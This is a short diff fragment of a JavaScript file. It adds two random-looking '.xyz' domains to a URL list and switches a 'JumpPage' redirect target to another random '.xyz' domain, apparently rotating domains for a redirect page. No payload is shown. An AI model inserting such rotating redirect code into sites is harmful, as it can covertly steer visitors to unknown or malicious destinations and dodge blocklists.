@@ -41,7 +41,7 @@ var urls=[];
         urls.push(".daagrwah.xyz");
         urls.push(".nebnnpry.xyz");
                                      	
-var JumpPage="https://osxirtsa.xyz";
+var JumpPage="https://qbfpvyr.xyz";
 
 var newestUrls = [];
 
